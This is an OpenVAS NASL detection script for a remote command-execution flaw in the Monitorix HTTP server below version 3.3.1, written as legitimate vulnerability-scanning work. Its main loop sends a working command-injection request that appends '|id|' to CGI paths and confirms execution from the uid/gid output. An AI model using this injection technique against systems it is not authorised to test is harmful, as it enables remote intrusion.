###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_monitorix_63913.nasl 5390 2017-02-21 18:39:27Z mime $
#
# Monitorix HTTP Server Remote Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103855";

tag_insight = "The handle_request() routine did not properly perform input sanitization
which led into a number of security vulnerabilities.";

tag_impact = "Successful exploits will result in the execution of arbitrary commands
in the context of the affected server.";

tag_affected = "Monitorix < 3.3.1";
tag_summary = "Monitorix HTTP Server Remote Code Execution Vulnerability";
tag_solution = "Updates are available.";
tag_vuldetect = "Send a special crafted HTTP GET request and check the response.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(63913);
 script_version ("$Revision: 5390 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_name("Monitorix HTTP Server Remote Code Execution Vulnerability");
 script_xref(name:"URL", value:"http://www.monitorix.org/news.html#N331");
 
 script_tag(name:"last_modification", value:"$Date: 2017-02-21 19:39:27 +0100 (Tue, 21 Feb 2017) $");
 script_tag(name:"creation_date", value:"2013-12-12 14:22:20 +0100 (Thu, 12 Dec 2013)");
 script_summary("Determine if it is possible to execute the id command.");
 script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl");
 script_mandatory_keys("Monitorix/banner");
 script_require_ports("Services/www", 8080);

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:8080);
if(!get_port_state(port))exit(0);

banner = get_http_banner(port:port);
if(!banner || "Monitorix" >!< banner)exit(0);

dirs = make_list(cgi_dirs());

foreach dir (dirs) {
   
  url = dir + '|id|';

  if(ret = http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+.*")) {

    report = 'It was possible to execute the "id" command on the remote host.\n\n' +
             'By requesting the URL "' + url + '" we received the following response:' + 
             '\n\n' + ret + '\n';
     
    security_message(port:port, data:report);
    exit(0);

  }
}

exit(99);

